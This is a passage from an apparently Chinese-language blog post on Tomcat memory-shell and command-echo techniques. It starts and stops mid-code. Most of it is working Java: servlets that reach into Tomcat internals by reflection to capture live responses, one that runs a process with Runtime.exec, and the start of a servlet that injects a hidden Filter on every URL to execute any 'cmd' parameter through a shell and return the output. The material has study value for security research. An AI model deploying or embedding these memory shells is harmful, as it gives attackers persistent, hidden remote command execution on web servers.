class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取context中的service</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">service</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            service.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService)service.get(ApplicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取service中的connectors</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connector = (Connector[])connectors.get(standardService);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                现在目的是反射获取 AbstractProtocol$ConnectionHandler 实例，这里可以直接反射获取所有的 AbstractProtocol 类集合，</span></span><br><span class="line"><span class="comment">                对其进行遍历时通过 if 找到正确的AbstractProtocol类 （org.apache.coyote.AbstractProtocol$ConnectionHandler）</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line"><span class="comment">/*      我看其他师傅也有这种写法，没研究啥原理，这样写的话，就可以少最外层的for循环和if判断，这里的connectors1[0]就很玄幻，为啥确定在这，因为想在短时间内学完内存马，急着用所以没仔细研究，以后有空回头来研究</span></span><br><span class="line"><span class="comment">            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();</span></span><br><span class="line"><span class="comment">            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span></span><br><span class="line"><span class="comment">            handler.setAccessible(true);</span></span><br><span class="line"><span class="comment">            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            Class&lt;?&gt;[] AbstractProtocol_list = Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredClasses();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; aClass : AbstractProtocol_list) &#123;</span><br><span class="line">                <span class="keyword">if</span> (aClass.getName().length()==<span class="number">52</span>)&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射获取global 和 RequestGroupInfo中的 processors</span></span><br><span class="line"><span class="comment">                    **/</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processors.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射实现了 RequestGroupInfo(global) ，调用方法获取到了全局的 requestGroupInfo</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[<span class="number">0</span>].getProtocolHandler(), <span class="literal">null</span>));</span><br><span class="line">                    java.util.List&lt;RequestInfo&gt; RequestInfo_list = (java.util.List&lt;RequestInfo&gt;) processors.get(requestGroupInfo);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">req</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    req.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        这里就遍历每个 requestInfo ，获取他们的req,再获取 response，就能达到回显的目的了</span></span><br><span class="line"><span class="comment">                    * */</span></span><br><span class="line">                    <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfo_list) &#123;</span><br><span class="line">                        org.apache.coyote.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (org.apache.coyote.Request )req.get(requestInfo);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request2</span> <span class="operator">=</span> ( org.apache.catalina.connector.Request)request1.getNote(<span class="number">1</span>);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response2</span> <span class="operator">=</span> request2.getResponse();</span><br><span class="line">                        response2.getWriter().write(<span class="string">&quot;TomcatEcho_General Injection success !&quot;</span>);</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">whoami</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).getInputStream();</span><br><span class="line">                        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(whoami);</span><br><span class="line">                        <span class="type">int</span> b ;</span><br><span class="line">                        <span class="keyword">while</span> ((b = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                            response2.getWriter().write(b);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObj</span><span class="params">(Object obj, String attr)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(attr);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>文章二的大佬还提供了另一个可以在 7，8，9 中均可使用的链子（以下是他说的上面的链子在 8 中会有小小的版本限制，在7中又缺失context的话）</p>
<blockquote>
<p>tomcat 8 的小版本有限制主要原因是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2804790-20220428003041172-926221891.png"
                      alt="image-20220427234613127"
                ></p>
<p>原因是<code>Tomcat7</code>获取到的<code>WebappClassLoaderBase</code>中没有context属性，所以会利用失败）</p>
</blockquote>
<p>tomcat 8 版本小问题确实存在，我上面也说了，我也遇到了。这个7这个base中不存在context属性。这俩在我看来的解决办法就是我上面提到的，使用 <code>getSession</code> 反射的方式来获取。当然，这个师傅也提供了他的解决思路，具体如下，我们也可以看看。</p>
<h4 id="马2"><a href="#马2" class="headerlink" title="马2"></a>马2</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Tomcat7Servlet&quot;, value = &quot;/Tomcat7Servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General_789</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> flag=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),<span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt; threads.length;i++)&#123;</span><br><span class="line">                Thread thread=threads[i];</span><br><span class="line">                String threadName=thread.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Object target= getField(thread,<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    Object this0=getField(target,<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    Object handler=getField(this0,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    Object global=getField(handler,<span class="string">&quot;global&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    ArrayList processors=(ArrayList) getField(global,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; processors.size(); j++) &#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processors.get(j);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo!=<span class="literal">null</span>)&#123;</span><br><span class="line">                            Request req=(Request) getField(requestInfo,<span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span>(org.apache.catalina.connector.Request) req.getNote(<span class="number">1</span>);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response1</span> <span class="operator">=</span>request1.getResponse();</span><br><span class="line"></span><br><span class="line">                            Writer writer=response.getWriter();</span><br><span class="line">                            writer.flush();</span><br><span class="line">                            writer.write(<span class="string">&quot;TomcatEcho789&quot;</span>);</span><br><span class="line">                            flag=<span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object obj,String fieldName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=<span class="literal">null</span>;</span><br><span class="line">        Class clas=obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clas!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field=clas.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">                clas=clas.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field!=<span class="literal">null</span>)&#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(obj);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="半通用回显"><a href="#半通用回显" class="headerlink" title="半通用回显"></a>半通用回显</h3><p>根据前文思路顺着堆栈一路向下查看Request和Response存储位置，只要获取到一个实例即可。</p>
<p>顺着思路，在<code>org.apache.catalina.core.ApplicationFilterChain</code>位置发现符合条件的变量。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br></pre></td></tr></table></figure></div>

<p><strong>ApplicationFilterChain#internalDoFilter 赋值</strong> </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; <span class="comment">// 设置为true</span></span><br><span class="line">    lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">    lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>添加思路:</strong></p>
<blockquote>
<ul>
<li><p>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p>
</li>
<li><p>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p>
</li>
<li><p>从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p>
</li>
</ul>
</blockquote>
<h4 id="tomcat半通用回显马"><a href="#tomcat半通用回显马" class="headerlink" title="tomcat半通用回显马"></a>tomcat半通用回显马</h4><p>（我看这哥们在tomcat半回显的基础上加上了恶意构造的Filter，通过前面对Filter的学习，这里还是好理解）</p>
<p><strong>半通用回显：</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>搭配filter</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/halfDemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half_WithFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> requestThreadLocal.get();</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();  <span class="comment">//这里实际获取到的是ApplicationContextFacade</span></span><br><span class="line">            <span class="keyword">if</span> (servletContext!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//编写恶意Filter</span></span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">ShellIntInject</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;start with cmd=&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(cmdParamName);</span><br><span class="line">                        <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                            String[] cmds = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line">                            writer.close();</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(request, response);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取ApplicationContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span 